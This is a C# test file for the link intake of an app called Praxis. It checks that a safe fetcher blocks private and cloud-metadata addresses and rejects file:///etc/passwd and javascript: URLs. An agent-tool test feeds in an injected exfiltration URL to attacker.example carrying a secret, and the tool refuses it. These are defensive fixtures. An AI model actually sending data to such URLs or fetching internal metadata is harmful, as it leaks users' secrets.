using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using Praxis.Application.Agents;
using Praxis.Application.Agents.Tools;
using Praxis.Application.Documents;
using Praxis.Application.Links;
using Praxis.Domain.Agents;
using Praxis.Domain.Media;
using Praxis.Domain.Originals;
using Praxis.Domain.Policy;
using Praxis.Infrastructure.Links;
using Praxis.Infrastructure.Persistence;
using Praxis.Infrastructure.Tests.Agents;
using Praxis.Infrastructure.Tests.Support;
using Xunit;

namespace Praxis.Infrastructure.Tests.Links;

/// <summary>Saved links: read as URLs, fetched only through the safe fetcher, captured as snapshot sources.</summary>
public sealed class LinkIntakeTests : IDisposable
{
    private const string Webloc = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>URL</key><string>https://example.org/guide?a=1&amp;b=2</string></dict></plist>
        """;

    private readonly string workspace = Path.Combine(TestPaths.Temp, "praxis-links-" + Guid.NewGuid().ToString("N"));
    private readonly string dataRoot;

    public LinkIntakeTests()
    {
        dataRoot = Path.Combine(workspace, "data");
        Directory.CreateDirectory(dataRoot);
        if (!OperatingSystem.IsWindows())
        {
            const UnixFileMode privateMode = UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute;
            File.SetUnixFileMode(workspace, privateMode);
            File.SetUnixFileMode(dataRoot, privateMode);
        }
    }

    [Theory]
    [InlineData("8.8.8.8", true)]
    [InlineData("2606:4700:4700::1111", true)]
    [InlineData("127.0.0.1", false)]
    [InlineData("10.1.2.3", false)]
    [InlineData("172.16.0.1", false)]
    [InlineData("192.168.1.10", false)]
    [InlineData("169.254.169.254", false)]
    [InlineData("100.64.0.1", false)]
    [InlineData("0.0.0.0", false)]
    [InlineData("224.0.0.1", false)]
    [InlineData("198.18.0.1", false)]
    [InlineData("::1", false)]
    [InlineData("fe80::1", false)]
    [InlineData("fd00::1", false)]
    [InlineData("::ffff:10.0.0.1", false)]
    [InlineData("::ffff:8.8.8.8", true)]
    [InlineData("64:ff9b::a00:1", false)]
    [InlineData("2001:db8::1", false)]
    public void OnlyPublicUnicastAddressesAreReachable(string address, bool expected) =>
        Assert.Equal(expected, NetworkAddressPolicy.IsPublic(IPAddress.Parse(address)));

    [Theory]
    [InlineData(".url", "[InternetShortcut]\r\nURL=https://example.org/page\r\n", "https://example.org/page")]
    [InlineData(".webloc", Webloc, "https://example.org/guide?a=1&b=2")]
    [InlineData(".url", "[InternetShortcut]\nURL=https://user:secret@example.org/\n", null)]
    [InlineData(".url", "[InternetShortcut]\nURL=file:///etc/passwd\n", null)]
    [InlineData(".url", "[InternetShortcut]\nURL=ftp://example.org/\n", null)]
    public void SavedLinkFilesYieldOnlyFetchableUrls(string extension, string content, string? expected) =>
        Assert.Equal(expected, SavedLink.FromFile(extension, Encoding.UTF8.GetBytes(content))?.AbsoluteUri);

    [Fact]
    public void BinaryWeblocYieldsItsUrl()
    {
        byte[] bplist = [.. "bplist00\xd1\x01\x02SURL_\x10\x1c"u8.ToArray(), .. "https://example.org/binary"u8.ToArray(), 0x08, 0x0b];
        Assert.Equal("https://example.org/binary", SavedLink.FromFile(".webloc", bplist)?.AbsoluteUri);
    }

    [Fact]
    public void WebVideoSnapshotReadsAsTranscriptWithTimingIntoItsText()
    {
        WebVideoSnapshot snapshot = new(WebVideoSnapshot.CurrentVersion, "https://www.youtube.com/watch?v=abcdefghijk",
            "https://www.youtube-nocookie.com/embed/abcdefghijk", "Postgres in ten minutes", "Data Channel", "A quick tour.", 600,
            [new WebVideoCue(1, 4, "Install Postgres with Homebrew."), new WebVideoCue(4, 9, "Then create a database.")]);

        ReadDocument document = WebVideoReader.Read(snapshot);

        Assert.StartsWith("# Postgres in ten minutes", document.Text, StringComparison.Ordinal);
        Assert.Equal(DocumentFormats.WebVideo, document.Format);
        TimedSpan second = document.Timings![1];
        Assert.Equal("Then create a database.", document.Text.Substring(second.Offset, second.Length));
        Assert.Equal((4_000L, 9_000L), (second.StartMilliseconds, second.EndMilliseconds));
        Assert.NotNull(WebVideoReader.Parse(JsonSerializer.SerializeToUtf8Bytes(snapshot)));
        Assert.Null(WebVideoReader.Parse(Encoding.UTF8.GetBytes("""{"praxisWebVideo":1,"url":"javascript:alert(1)"}""")));
    }

    [Theory]
    [InlineData("https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=10", "dQw4w9WgXcQ")]
    [InlineData("https://youtu.be/dQw4w9WgXcQ?si=x", "dQw4w9WgXcQ")]
    [InlineData("https://www.youtube.com/shorts/dQw4w9WgXcQ", "dQw4w9WgXcQ")]
    [InlineData("https://m.youtube.com/embed/dQw4w9WgXcQ", "dQw4w9WgXcQ")]
    [InlineData("https://www.youtube.com/watch?v=short", null)]
    [InlineData("https://example.org/watch?v=dQw4w9WgXcQ", null)]
    public void YouTubeVideoIdsAreRecognized(string url, string? expected) => Assert.Equal(expected, YouTubeLinkResolver.VideoId(new Uri(url)));

    [Fact]
    public void RollingAutoCaptionsAreDeduplicated()
    {
        const string vtt = """
            WEBVTT
            Kind: captions

            00:00:01.000 --> 00:00:03.000 align:start position:0%
            first we<00:00:01.500><c> install</c>

            00:00:03.000 --> 00:00:03.010
            first we install

            00:00:03.010 --> 00:00:05.000
            first we install
            then we configure

            00:00:05.000 --> 00:00:07.000
            then we configure
            the database
            """;

        IReadOnlyList<WebVideoCue> cues = YouTubeLinkResolver.ParseCaptions(vtt);

        Assert.Equal(["first we install", "then we configure", "the database"], cues.Select(cue => cue.Text));
        Assert.Equal((5.0, 7.0), (cues[2].Start, cues[2].End));
    }

    [Fact]
    public async Task FetcherRefusesPrivateAddressesAndRedirectsToThem()
    {
        using SafeHttpFetcher strict = new();
        Assert.Equal("private_address", (await strict.FetchAsync(new Uri("http://127.0.0.1:9/"), CancellationToken.None)).ReasonCode);
        Assert.Equal("private_address", (await strict.FetchAsync(new Uri("http://localhost:9/"), CancellationToken.None)).ReasonCode);

        using TestServer server = TestServer.Start(path => path switch
        {
            "/page" => (200, "text/html; charset=utf-8", "<html><head><title>Guide</title></head><body><p>Hello</p></body></html>", null),
            "/metadata" => (302, "text/plain", string.Empty, "http://169.254.169.254/latest/meta-data/"),
            "/binary" => (200, "application/octet-stream", "MZ", null),
            "/loop" => (302, "text/plain", string.Empty, "/loop"),
            _ => (404, "text/plain", "missing", null)
        });
        using SafeHttpFetcher loopbackAllowed = new(address => IPAddress.IsLoopback(address) || NetworkAddressPolicy.IsPublic(address));

        FetchedPage page = await loopbackAllowed.FetchAsync(server.Url("/page"), CancellationToken.None);
        Assert.Equal((200, "Guide"), (page.Status, Praxis.Application.Documents.Html.HtmlText.Title(Encoding.UTF8.GetString(page.Body!))));
        Assert.Equal("private_address", (await loopbackAllowed.FetchAsync(server.Url("/metadata"), CancellationToken.None)).ReasonCode);
        Assert.Equal("unsupported_content", (await loopbackAllowed.FetchAsync(server.Url("/binary"), CancellationToken.None)).ReasonCode);
        Assert.Equal("too_many_redirects", (await loopbackAllowed.FetchAsync(server.Url("/loop"), CancellationToken.None)).ReasonCode);
        Assert.Equal(("http_error", 404), ((await loopbackAllowed.FetchAsync(server.Url("/nope"), CancellationToken.None)) is var missing
            ? (missing.ReasonCode, missing.Status) : default));
    }

    [Fact]
    public async Task ASavedLinkIsFetchedOnceAndCapturedAsASnapshotSource()
    {
        using SqliteCatalog catalog = SqliteCatalog.Open(dataRoot);
        CapturedOriginal link = await Capture(catalog, "Postgres guide.webloc", Webloc);
        await Capture(catalog, "notes.md", "# Notes\nSee https://example.org/elsewhere for more.");
        ProcessingDriver reader = ProcessingDriver.Text(catalog);
        Assert.True(await reader.ProcessNextAsync());
        Assert.True(await reader.ProcessNextAsync());
        Assert.Equal(DocumentFormats.Link, catalog.Understanding.ReadCurrent(link.SourceId)?.Format);

        FakeFetcher fetcher = new(new FetchedPage(new Uri("https://example.org/guide"), 200, "text/html; charset=utf-8",
            Encoding.UTF8.GetBytes("<html><head><title>Postgres Guide</title></head><body><h1>Install</h1><p>Use Homebrew.</p></body></html>"), null));
        FakeWriter writer = new(workspace);
        ProcessingDriver links = new(catalog, new LinkFetchHandler(catalog.Links, fetcher, writer, [], TimeProvider.System));

        Assert.True(await links.ProcessNextAsync());
        Assert.False(await links.ProcessNextAsync());

        Assert.Equal(["https://example.org/guide?a=1&b=2"], fetcher.Requested.Select(url => url.AbsoluteUri));
        (string name, string extension, string content) = Assert.Single(writer.Written);
        Assert.Equal(("Postgres Guide", ".md"), (name, extension));
        Assert.StartsWith("# Postgres Guide\n\nSource: https://example.org/guide\n", content, StringComparison.Ordinal);
        Assert.Contains("Use Homebrew.", content, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("off", "", "links_off")]
    [InlineData("saved_links", "example.org", "host_blocked")]
    public async Task SettingsDecideWhetherAnythingIsFetched(string mode, string blocked, string expected)
    {
        using SqliteCatalog catalog = SqliteCatalog.Open(dataRoot);
        catalog.Links.SaveSettings(new LinkSettings(mode, blocked.Length == 0 ? [] : [blocked]));
        await Capture(catalog, "guide.url", "[InternetShortcut]\nURL=https://docs.example.org/guide\n");
        Assert.True(await ProcessingDriver.Text(catalog).ProcessNextAsync());
        FakeFetcher fetcher = new(FetchedPage.Failed("unreachable"));
        FakeWriter writer = new(workspace);

        Assert.True(await new ProcessingDriver(catalog, new LinkFetchHandler(catalog.Links, fetcher, writer, [], TimeProvider.System)).ProcessNextAsync());

        Assert.Empty(fetcher.Requested);
        Assert.Empty(writer.Written);
        Assert.Equal(expected, ReadOutcome(catalog));
        LinkSettings read = catalog.Links.ReadSettings();
        Assert.Equal(mode, read.Mode);
        Assert.Equal(blocked.Length == 0 ? [] : [blocked], read.BlockedHosts);
    }

    [Fact]
    public async Task WithoutAnIntakeFolderOrWithAVideoResolverTheLinkIsHandledWithoutTheFetcher()
    {
        using SqliteCatalog catalog = SqliteCatalog.Open(dataRoot);
        await Capture(catalog, "talk.url", "[InternetShortcut]\nURL=https://www.youtube.com/watch?v=dQw4w9WgXcQ\n");
        Assert.True(await ProcessingDriver.Text(catalog).ProcessNextAsync());
        FakeFetcher fetcher = new(FetchedPage.Failed("unreachable"));
        Assert.True(await new ProcessingDriver(catalog, new LinkFetchHandler(catalog.Links, fetcher, null, [], TimeProvider.System)).ProcessNextAsync());
        Assert.Equal("no_intake_folder", ReadOutcome(catalog));

        string secondRoot = Path.Combine(workspace, "second");
        Directory.CreateDirectory(secondRoot);
        if (!OperatingSystem.IsWindows())
        {
            File.SetUnixFileMode(secondRoot, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        }

        using SqliteCatalog second = SqliteCatalog.Open(secondRoot);
        await Capture(second, "talk.url", "[InternetShortcut]\nURL=https://www.youtube.com/watch?v=dQw4w9WgXcQ\n");
        Assert.True(await ProcessingDriver.Text(second).ProcessNextAsync());
        FakeWriter writer = new(workspace);
        FakeVideo video = new();
        Assert.True(await new ProcessingDriver(second, new LinkFetchHandler(second.Links, fetcher, writer, [video], TimeProvider.System)).ProcessNextAsync());
        Assert.Empty(fetcher.Requested);
        (string name, string extension, string content) = Assert.Single(writer.Written);
        Assert.Equal(("Recorded talk", WebVideoSnapshot.Extension), (name, extension));
        Assert.Equal("Recorded talk", WebVideoReader.Parse(Encoding.UTF8.GetBytes(content))?.Title);
    }

    [Fact]
    public async Task UpgradingToVersion24QueuesAFetchForLinksCapturedBefore()
    {
        string path;
        using (SqliteCatalog catalog = SqliteCatalog.Open(dataRoot))
        {
            await Capture(catalog, "old.url", "[InternetShortcut]\nURL=https://example.org/old\n");
            Assert.True(await ProcessingDriver.Text(catalog).ProcessNextAsync());
            path = catalog.DatabasePath;
        }

        using (Microsoft.Data.Sqlite.SqliteConnection connection = new($"Data Source={path};Pooling=False"))
        {
            connection.Open();
            using Microsoft.Data.Sqlite.SqliteCommand downgrade = connection.CreateCommand();
            downgrade.CommandText = """
                DELETE FROM processing_jobs WHERE processor_key = 'link-fetch-v1';
                DROP TABLE link_snapshots; DROP TABLE link_settings; DROP TABLE text_timings; DROP TABLE intake_projects;
                PRAGMA user_version = 23;
                """;
            downgrade.ExecuteNonQuery();
        }

        using SqliteCatalog upgraded = SqliteCatalog.Open(dataRoot);
        FakeFetcher fetcher = new(new FetchedPage(new Uri("https://example.org/old"), 200, "text/plain", "Old page."u8.ToArray(), null));
        Assert.True(await new ProcessingDriver(upgraded, new LinkFetchHandler(upgraded.Links, fetcher, new FakeWriter(workspace), [], TimeProvider.System))
            .ProcessNextAsync());
        Assert.Equal(["https://example.org/old"], fetcher.Requested.Select(url => url.AbsoluteUri));
    }

    [Fact]
    public async Task TheAgentSavesOnlyLinksTheOwnerTyped()
    {
        using SqliteCatalog catalog = SqliteCatalog.Open(dataRoot);
        catalog.Agents.SaveBackend(new AgentBackendProfile("local", AgentBackendKinds.OpenAiCompatible, "http://127.0.0.1:11434/v1", "m", null, null, true));
        AgentConversation conversation = catalog.Agents.Create("local", "links");
        catalog.Agents.Append(conversation.ConversationId, AgentMessage.FromUser("Please save https://example.org/owner-typed for later"));
        RecordingLinkWriter writer = new();
        KnowledgeSaveLinkTool tool = new(writer, catalog.Agents, catalog.Links);
        AgentToolContext context = AgentPrimitivesTests.Context(ToolPermissions.ProposeEdits) with { ConversationId = conversation.ConversationId };

        AgentToolOutput injected = await tool.InvokeAsync(Json("""{"url":"https://attacker.example/collect?secret=1"}"""), context, CancellationToken.None);
        AgentToolOutput saved = await tool.InvokeAsync(Json("""{"url":"https://example.org/owner-typed"}"""), context, CancellationToken.None);

        Assert.Contains("url_not_from_owner", injected.Content, StringComparison.Ordinal);
        Assert.Equal(["https://example.org/owner-typed"], writer.Saved);
        Assert.Contains("\"saved\":true", saved.Content, StringComparison.Ordinal);
    }

    [Fact]
    public async Task SavedLinkWriterWritesAStandardWeblocThatReadsBack()
    {
        using SqliteCatalog catalog = SqliteCatalog.Open(dataRoot);
        string intake = Path.Combine(workspace, "intake");
        Directory.CreateDirectory(intake);
        string path = await new SavedLinkWriter(catalog.Originals, dataRoot, intake).SaveAsync(new Uri("https://example.org/a?x=1&y=<2>"), "A & B",
            CancellationToken.None);

        Assert.Equal(Path.Combine(intake, SavedLinkWriter.FolderName), Path.GetDirectoryName(path));
        Assert.EndsWith(".webloc", path, StringComparison.Ordinal);
        Assert.Equal("https://example.org/a?x=1&y=%3C2%3E", SavedLink.FromFile(".webloc", await File.ReadAllBytesAsync(path))?.AbsoluteUri);
        Assert.Single(catalog.Library.List(10, 0, null), item => item.SourceLocator.EndsWith(".webloc", StringComparison.Ordinal));
    }

    private static string? ReadOutcome(SqliteCatalog catalog)
    {
        using Microsoft.Data.Sqlite.SqliteConnection connection = new($"Data Source={Path.Combine(catalog.DataDirectory, "catalog.sqlite")};Mode=ReadOnly");
        connection.Open();
        using Microsoft.Data.Sqlite.SqliteCommand command = connection.CreateCommand();
        command.CommandText = "SELECT reason FROM link_snapshots LIMIT 1";
        return command.ExecuteScalar() as string;
    }

    private static JsonElement Json(string json) => JsonDocument.Parse(json).RootElement.Clone();

    private async Task<CapturedOriginal> Capture(SqliteCatalog catalog, string filename, string contents)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(contents);
        using MemoryStream source = new(bytes);
        return await catalog.Originals.CaptureFileAsync(Path.Combine(workspace, "incoming", filename), source, bytes.Length + 1, filename + catalog.DataDirectory);
    }

    public void Dispose()
    {
        if (Directory.Exists(workspace))
        {
            Directory.Delete(workspace, recursive: true);
        }
    }

    private sealed class FakeFetcher(FetchedPage page) : ILinkFetcher
    {
        public List<Uri> Requested { get; } = [];

        public Task<FetchedPage> FetchAsync(Uri url, CancellationToken cancellationToken)
        {
            Requested.Add(url);
            return Task.FromResult(page);
        }
    }

    private sealed class FakeWriter(string workspace) : ILinkSnapshotWriter
    {
        public List<(string Name, string Extension, string Content)> Written { get; } = [];

        public Task<string> WriteAsync(string name, string extension, byte[] content, CancellationToken cancellationToken)
        {
            Written.Add((name, extension, Encoding.UTF8.GetString(content)));
            return Task.FromResult(Path.Combine(workspace, "Praxis Web", name + extension));
        }
    }

    private sealed class FakeVideo : IVideoLinkResolver
    {
        public bool Handles(Uri url) => YouTubeLinkResolver.VideoId(url) is not null;

        public Task<WebVideoSnapshot?> ResolveAsync(Uri url, CancellationToken cancellationToken) =>
            Task.FromResult<WebVideoSnapshot?>(new WebVideoSnapshot(WebVideoSnapshot.CurrentVersion, url.AbsoluteUri,
                "https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ", "Recorded talk", null, null, null, [new WebVideoCue(0, 2, "Hello.")]));
    }

    private sealed class RecordingLinkWriter : ISavedLinkWriter
    {
        public List<string> Saved { get; } = [];

        public Task<string> SaveAsync(Uri url, string? title, CancellationToken cancellationToken)
        {
            Saved.Add(url.AbsoluteUri);
            return Task.FromResult("/tmp/link.webloc");
        }
    }

    /// <summary>A loopback HTTP server answering each path with a status, type, body and optional redirect.</summary>
    private sealed class TestServer : IDisposable
    {
        private readonly HttpListener listener = new();
        private readonly int port;

        private TestServer(Func<string, (int Status, string Type, string Body, string? Location)> respond)
        {
            using (TcpListener probe = new(IPAddress.Loopback, 0))
            {
                probe.Start();
                port = ((IPEndPoint)probe.LocalEndpoint).Port;
            }

            listener.Prefixes.Add($"http://127.0.0.1:{port}/");
            listener.Start();
            _ = Task.Run(async () =>
            {
                while (listener.IsListening)
                {
                    HttpListenerContext context;
                    try
                    {
                        context = await listener.GetContextAsync();
                    }
                    catch (Exception exception) when (exception is HttpListenerException or ObjectDisposedException)
                    {
                        return;
                    }

                    (int status, string type, string body, string? location) = respond(context.Request.Url!.AbsolutePath);
                    context.Response.StatusCode = status;
                    context.Response.ContentType = type;
                    if (location is not null)
                    {
                        context.Response.RedirectLocation = location;
                    }

                    byte[] bytes = Encoding.UTF8.GetBytes(body);
                    context.Response.ContentLength64 = bytes.Length;
                    await context.Response.OutputStream.WriteAsync(bytes);
                    context.Response.Close();
                }
            });
        }

        public static TestServer Start(Func<string, (int, string, string, string?)> respond) => new(respond);

        public Uri Url(string path) => new($"http://127.0.0.1:{port}{path}");

        public void Dispose() => listener.Close();
    }
}
